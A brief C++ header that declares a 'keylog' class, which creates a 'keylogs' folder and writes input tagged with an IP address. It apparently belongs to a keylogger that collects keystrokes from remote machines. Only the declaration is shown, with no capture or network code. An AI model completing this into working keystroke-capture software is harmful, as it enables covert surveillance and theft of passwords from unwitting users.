#pragma once
#include <fstream>
#include <filesystem>

namespace fs = std::filesystem;

class keylog
{
public:
	keylog() {
		fs::create_directory("keylogs");
	};
	void write(std::string& input, std::string IP);
};
